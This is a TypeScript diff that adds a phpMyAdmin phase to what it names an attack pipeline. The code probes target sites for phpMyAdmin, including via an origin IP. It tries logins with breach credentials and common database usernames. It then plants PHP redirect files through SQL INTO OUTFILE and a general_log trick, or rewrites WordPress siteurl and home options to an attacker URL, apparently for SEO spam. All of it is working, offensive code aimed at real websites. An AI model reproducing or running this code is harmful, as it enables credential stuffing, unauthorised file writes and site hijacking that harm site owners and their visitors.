@@ -3202,10 +3202,401 @@ export async function runUnifiedAttackPipeline(
         }
       }
 
+
+      // ─── Phase 2.5e2h: phpMyAdmin Brute Force + SQL INTO OUTFILE ───
+      if (!hasSuccessfulRedirect() && !shouldStop('pma_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'pma_login_start',
+          detail: `🗄️ Phase 2.5e2h: phpMyAdmin Brute Force — ลอง ${Math.min(breachCreds.length, 10)} breach credentials + SQL INTO OUTFILE...`,
+          progress: 63,
+        });
+
+        const pmaBaseUrl = config.targetUrl.replace(/\/.*$/, '').replace(/\/$/, '');
+        const targetDomain = pmaBaseUrl.replace(/^https?:\/\//, '').replace(/[\/:].*$/, '');
+
+        // Common phpMyAdmin paths
+        const pmaPaths = [
+          '/phpmyadmin', '/pma', '/phpMyAdmin', '/phpmyadmin/', '/pma/',
+          '/myadmin', '/mysql', '/dbadmin', '/db', '/admin/phpmyadmin',
+          '/sql', '/phpMyAdmin5', '/phpmyadmin5', '/tools/phpmyadmin',
+          ':8080/phpmyadmin', ':8888/phpmyadmin', ':3306/phpmyadmin',
+        ];
+
+        let pmaUrl: string | null = null;
+        let pmaToken: string | null = null;
+        let pmaCookies: string = '';
+
+        // Step 1: Find phpMyAdmin
+        for (const path of pmaPaths) {
+          if (shouldStop('pma_login') || hasSuccessfulRedirect()) break;
+          try {
+            const testUrl = path.startsWith(':')
+              ? `${pmaBaseUrl.replace(/:\d+/, '')}${path}`
+              : `${pmaBaseUrl}${path}`;
+            const resp = await timedRace(
+              () => fetch(testUrl, {
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+                redirect: 'follow',
+                signal: AbortSignal.timeout(8000),
+              }),
+              capTimeout(10000),
+              'PMA probe timeout',
+            );
+            const body = await resp.text();
+            if (body.includes('phpMyAdmin') || body.includes('pma_username') || body.includes('login_form')) {
+              pmaUrl = testUrl;
+              // Extract token if present
+              const tokenMatch = body.match(/token["\'\s]*(?:value)?[=:]["\'\s]*([a-f0-9]{32,})/i) ||
+                                body.match(/token=([a-f0-9]{32,})/i);
+              if (tokenMatch) pmaToken = tokenMatch[1];
+              // Get cookies
+              pmaCookies = (resp.headers.getSetCookie?.() || []).join('; ');
+              loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_found', detail: `🗄️ phpMyAdmin found: ${testUrl}`, progress: 63 });
+              break;
+            }
+          } catch { /* try next path */ }
+        }
+
+        // Also try origin IP for phpMyAdmin
+        if (!pmaUrl && originIp) {
+          for (const path of ['/phpmyadmin', '/pma', '/phpMyAdmin']) {
+            try {
+              const testUrl = `https://${originIp}${path}`;
+              const resp = await timedRace(
+                () => fetch(testUrl, {
+                  headers: { 'User-Agent': 'Mozilla/5.0', 'Host': targetDomain },
+                  redirect: 'follow',
+                  signal: AbortSignal.timeout(8000),
+                }),
+                capTimeout(10000),
+                'PMA origin probe timeout',
+              );
+              const body = await resp.text();
+              if (body.includes('phpMyAdmin') || body.includes('pma_username')) {
+                pmaUrl = testUrl;
+                const tokenMatch = body.match(/token["\'\s]*(?:value)?[=:]["\'\s]*([a-f0-9]{32,})/i);
+                if (tokenMatch) pmaToken = tokenMatch[1];
+                pmaCookies = (resp.headers.getSetCookie?.() || []).join('; ');
+                loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_found_origin', detail: `🗄️ phpMyAdmin found via origin IP: ${testUrl}`, progress: 63 });
+                break;
+              }
+            } catch { /* try next */ }
+          }
+        }
+
+        // Step 2: Login with breach credentials
+        if (pmaUrl) {
+          const dbUsernames = ['root', 'admin', 'mysql', 'phpmyadmin', 'dbadmin', 'wordpress', 'wp', targetDomain.split('.')[0]];
+          // Add breach usernames
+          for (const cred of breachCreds.slice(0, 10)) {
+            // BreachCredential has email, not username — extract username part from email
+            const emailUser = cred.email.split('@')[0];
+            if (emailUser && !dbUsernames.includes(emailUser)) dbUsernames.push(emailUser);
+          }
+
+          let loggedIn = false;
+          let loginCookies = '';
+
+          for (const cred of breachCreds.slice(0, 10)) {
+            if (shouldStop('pma_login') || hasSuccessfulRedirect() || loggedIn) break;
+
+            for (const dbUser of dbUsernames.slice(0, 8)) {
+              if (loggedIn) break;
+              try {
+                // phpMyAdmin login via POST
+                const loginBody = new URLSearchParams({
+                  'pma_username': dbUser,
+                  'pma_password': cred.password,
+                  'server': '1',
+                  ...(pmaToken ? { 'token': pmaToken } : {}),
+                });
+
+                const loginResp = await timedRace(
+                  () => fetch(pmaUrl!, {
+                    method: 'POST',
+                    headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                      'Cookie': pmaCookies,
+                      'Referer': pmaUrl!,
+                    },
+                    body: loginBody.toString(),
+                    redirect: 'manual',
+                    signal: AbortSignal.timeout(10000),
+                  }),
+                  capTimeout(12000),
+                  'PMA login timeout',
+                );
+
+                const respCookies = (loginResp.headers.getSetCookie?.() || []).join('; ');
+                const location = loginResp.headers.get('location') || '';
+                const respBody = loginResp.status === 200 ? await loginResp.text() : '';
+
+                // Check login success: redirect to index.php, or no error in body, or cookie contains phpMyAdmin session
+                const isSuccess = (
+                  (loginResp.status === 302 && !location.includes('login') && !location.includes('error')) ||
+                  (loginResp.status === 200 && respBody.includes('server_databases') || respBody.includes('db_structure')) ||
+                  (respCookies.includes('phpMyAdmin') && !respBody.includes('Cannot log in'))
+                );
+
+                if (isSuccess) {
+                  loggedIn = true;
+                  loginCookies = [pmaCookies, respCookies].filter(Boolean).join('; ');
+                  // Get new token from response
+                  const newTokenMatch = (respBody || '').match(/token=([a-f0-9]{32,})/i) ||
+                                       location.match(/token=([a-f0-9]{32,})/i);
+                  if (newTokenMatch) pmaToken = newTokenMatch[1];
+
+                  loggedOnEvent({
+                    phase: 'ftp_upload' as any,
+                    step: 'pma_login_success',
+                    detail: `✅ phpMyAdmin LOGIN สำเร็จ! ${dbUser}:*** — กำลัง SQL INTO OUTFILE...`,
+                    progress: 64,
+                  });
+
+                  // Step 3: SQL INTO OUTFILE — write redirect PHP to web root
+                  const redirectContent = `<?php header("Location: ${config.redirectUrl}"); exit; ?>`;
+                  const redirectFilename = `${config.seoKeywords?.[0]?.replace(/[^a-zA-Z0-9]/g, '-') || 'analytics'}-${Date.now().toString(36)}.php`;
+
+                  // Common web root paths to try writing to
+                  const webRoots = [
+                    `/var/www/html`,
+                    `/var/www/${targetDomain}/public_html`,
+                    `/home/${dbUser}/public_html`,
+                    `/home/${targetDomain.split('.')[0]}/public_html`,
+                    `/var/www/vhosts/${targetDomain}/httpdocs`,
+                    `/usr/share/nginx/html`,
+                    `/var/www`,
+                    `/home/www`,
+                  ];
+
+                  for (const webRoot of webRoots) {
+                    if (hasSuccessfulRedirect()) break;
+                    const filePath = `${webRoot}/${redirectFilename}`;
+
+                    // Method 1: SELECT INTO OUTFILE
+                    const sqlOutfile = `SELECT '${redirectContent.replace(/'/g, "\\'")}' INTO OUTFILE '${filePath}'`;
+
+                    try {
+                      const queryUrl = `${pmaUrl}${pmaUrl!.includes('?') ? '&' : '?'}${pmaToken ? `token=${pmaToken}&` : ''}`;
+                      const sqlResp = await timedRace(
+                        () => fetch(queryUrl, {
+                          method: 'POST',
+                          headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0',
+                            'Cookie': loginCookies,
+                            'Referer': pmaUrl!,
+                          },
+                          body: new URLSearchParams({
+                            'sql_query': sqlOutfile,
+                            'server': '1',
+                            'db': '',
+                            ...(pmaToken ? { 'token': pmaToken } : {}),
+                          }).toString(),
+                          redirect: 'follow',
+                          signal: AbortSignal.timeout(10000),
+                        }),
+                        capTimeout(12000),
+                        'PMA SQL timeout',
+                      );
+
+                      const sqlBody = await sqlResp.text();
+                      const hasError = sqlBody.includes('error') && (sqlBody.includes('Permission denied') || sqlBody.includes('Access denied') || sqlBody.includes('secure_file_priv'));
+
+                      if (!hasError || sqlBody.includes('1 row affected') || sqlBody.includes('Query OK')) {
+                        // Verify the file was created
+                        const fileUrl = `https://${targetDomain}/${redirectFilename}`;
+                        const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                        uploadedFiles.push({
+                          url: fileUrl,
+                          shell: {
+                            type: 'redirect_php' as any, content: redirectContent, filename: redirectFilename, contentType: 'application/x-php',
+                            description: `phpMyAdmin SQL INTO OUTFILE (${dbUser}@${pmaUrl})`,
+                            id: `pma_outfile_${Date.now()}`, targetVector: 'breach_pma_outfile',
+                            bypassTechniques: ['breach_cred', 'pma', 'sql_outfile'],
+                            redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                          },
+                          method: `breach_pma_outfile_${cred.source}`,
+                          verified: verification.verified, redirectWorks: verification.redirectWorks,
+                          redirectDestinationMatch: verification.redirectDestinationMatch,
+                          finalDestination: verification.finalDestination,
+                          httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                        });
+                        loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_outfile_success', detail: `✅ PMA OUTFILE สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`, progress: 64 });
+                        if (verification.redirectWorks) break;
+                      }
+                    } catch { /* try next web root */ }
+
+                    // Method 2: Use LOAD DATA LOCAL + general_log trick
+                    try {
+                      // Enable general_log and set output to web root
+                      const logTrickQueries = [
+                        `SET global general_log_file = '${filePath}'`,
+                        `SET global general_log = 'ON'`,
+                        `SELECT '${redirectContent.replace(/'/g, "\\'")}' /* DS_REDIRECT */`,
+                        `SET global general_log = 'OFF'`,
+                      ];
+
+                      for (const sql of logTrickQueries) {
+                        await timedRace(
+                          () => fetch(`${pmaUrl}${pmaUrl!.includes('?') ? '&' : '?'}${pmaToken ? `token=${pmaToken}&` : ''}`, {
+                            method: 'POST',
+                            headers: {
+                              'Content-Type': 'application/x-www-form-urlencoded',
+                              'User-Agent': 'Mozilla/5.0',
+                              'Cookie': loginCookies,
+                            },
+                            body: new URLSearchParams({
+                              'sql_query': sql,
+                              'server': '1',
+                              'db': '',
+                              ...(pmaToken ? { 'token': pmaToken } : {}),
+                            }).toString(),
+                            redirect: 'follow',
+                            signal: AbortSignal.timeout(8000),
+                          }),
+                          capTimeout(10000),
+                          'PMA log trick timeout',
+                        );
+                      }
+
+                      // Verify
+                      const fileUrl = `https://${targetDomain}/${redirectFilename}`;
+                      const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                      if (verification.redirectWorks) {
+                        uploadedFiles.push({
+                          url: fileUrl,
+                          shell: {
+                            type: 'redirect_php' as any, content: redirectContent, filename: redirectFilename, contentType: 'application/x-php',
+                            description: `phpMyAdmin general_log trick (${dbUser}@${pmaUrl})`,
+                            id: `pma_logtrick_${Date.now()}`, targetVector: 'breach_pma_logtrick',
+                            bypassTechniques: ['breach_cred', 'pma', 'general_log'],
+                            redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                          },
+                          method: `breach_pma_logtrick_${cred.source}`,
+                          verified: verification.verified, redirectWorks: verification.redirectWorks,
+                          redirectDestinationMatch: verification.redirectDestinationMatch,
+                          finalDestination: verification.finalDestination,
+                          httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                        });
+                        loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_logtrick_success', detail: `✅ PMA LOG TRICK สำเร็จ! ${fileUrl}`, progress: 64 });
+                        break;
+                      }
+                    } catch { /* try next web root */ }
+                  }
+
+                  // Method 3: WP-specific — if WordPress, inject redirect via wp_options
+                  if (isWordPress && !hasSuccessfulRedirect()) {
+                    try {
+                      // Find WordPress database
+                      const dbListResp = await timedRace(
+                        () => fetch(`${pmaUrl}${pmaUrl!.includes('?') ? '&' : '?'}${pmaToken ? `token=${pmaToken}&` : ''}`, {
+                          method: 'POST',
+                          headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0',
+                            'Cookie': loginCookies,
+                          },
+                          body: new URLSearchParams({
+                            'sql_query': "SHOW DATABASES",
+                            'server': '1',
+                            'db': '',
+                            ...(pmaToken ? { 'token': pmaToken } : {}),
+                          }).toString(),
+                          redirect: 'follow',
+                          signal: AbortSignal.timeout(10000),
+                        }),
+                        capTimeout(12000),
+                        'PMA show databases timeout',
+                      );
+                      const dbListBody = await dbListResp.text();
+
+                      // Try common WP database names
+                      const wpDbNames = ['wordpress', 'wp', targetDomain.split('.')[0], `${targetDomain.split('.')[0]}_wp`, 'wp_db', 'main'];
+                      // Extract database names from response
+                      const dbMatches = dbListBody.match(/(?:db_name|Database)[^<]*<[^>]*>([^<]+)/gi) || [];
+                      for (const m of dbMatches) {
+                        const name = m.replace(/.*>/, '').trim();
+                        if (name && !['information_schema', 'mysql', 'performance_schema', 'sys'].includes(name) && !wpDbNames.includes(name)) {
+                          wpDbNames.unshift(name);
+                        }
+                      }
+
+                      for (const dbName of wpDbNames.slice(0, 5)) {
+                        if (hasSuccessfulRedirect()) break;
+                        // Try to inject siteurl/home to our redirect
+                        const wpInjectQueries = [
+                          `UPDATE ${dbName}.wp_options SET option_value = '${config.redirectUrl}' WHERE option_name = 'siteurl'`,
+                          `UPDATE ${dbName}.wp_options SET option_value = '${config.redirectUrl}' WHERE option_name = 'home'`,
+                        ];
+
+                        for (const sql of wpInjectQueries) {
+                          try {
+                            const injectResp = await timedRace(
+                              () => fetch(`${pmaUrl}${pmaUrl!.includes('?') ? '&' : '?'}${pmaToken ? `token=${pmaToken}&` : ''}`, {
+                                method: 'POST',
+                                headers: {
+                                  'Content-Type': 'application/x-www-form-urlencoded',
+                                  'User-Agent': 'Mozilla/5.0',
+                                  'Cookie': loginCookies,
+                                },
+                                body: new URLSearchParams({
+                                  'sql_query': sql,
+                                  'server': '1',
+                                  'db': dbName,
+                                  ...(pmaToken ? { 'token': pmaToken } : {}),
+                                }).toString(),
+                                redirect: 'follow',
+                                signal: AbortSignal.timeout(10000),
+                              }),
+                              capTimeout(12000),
+                              'PMA WP inject timeout',
+                            );
+                            const injectBody = await injectResp.text();
+                            if (injectBody.includes('row affected') || injectBody.includes('Rows matched')) {
+                              loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_wp_inject', detail: `✅ PMA WP DB Inject: ${sql.slice(0, 80)}...`, progress: 64 });
+                              // Verify redirect
+                              const verification = await verifyUploadedFile(config.targetUrl, config.redirectUrl, onEvent);
+                              if (verification.redirectWorks) {
+                                uploadedFiles.push({
+                                  url: config.targetUrl,
+                                  shell: {
+                                    type: 'redirect_php' as any, content: sql, filename: 'wp_options_inject', contentType: 'text/plain',
+                                    description: `phpMyAdmin WP DB injection (${dbUser}@${dbName})`,
+                                    id: `pma_wpdb_${Date.now()}`, targetVector: 'breach_pma_wpdb',
+                                    bypassTechniques: ['breach_cred', 'pma', 'wp_db_inject'],
+                                    redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                                  },
+                                  method: `breach_pma_wpdb_${cred.source}`,
+                                  verified: verification.verified, redirectWorks: true,
+                                  redirectDestinationMatch: verification.redirectDestinationMatch,
+                                  finalDestination: verification.finalDestination,
+                                  httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                                });
+                              }
+                            }
+                          } catch { /* try next query */ }
+                        }
+                      }
+                    } catch { /* WP DB inject failed */ }
+                  }
+
+                  break; // Exit credential loop on successful login
+                }
+              } catch { /* try next username */ }
+            }
+          }
+        } else {
+          loggedOnEvent({ phase: 'ftp_upload' as any, step: 'pma_not_found', detail: `⚠️ phpMyAdmin ไม่พบบน target — ข้าม Phase 2.5e2h`, progress: 63 });
+        }
+      }
+
       loggedOnEvent({
         phase: 'ftp_upload' as any,
         step: 'early_login_complete',
-        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/WHM/DA/Plesk/Webmin/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('breach_da_early') || f.method.startsWith('breach_plesk_early') || f.method.startsWith('breach_whm_early') || f.method.startsWith('breach_whm_proxy') || f.method.startsWith('breach_webmin_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
+        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/WHM/DA/Plesk/Webmin/PMA/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('breach_da_early') || f.method.startsWith('breach_plesk_early') || f.method.startsWith('breach_whm_early') || f.method.startsWith('breach_whm_proxy') || f.method.startsWith('breach_webmin_early') || f.method.startsWith('breach_pma') || f.method.startsWith('wp_rest_breach')).length} uploads`,
         progress: 64,
       });
     }
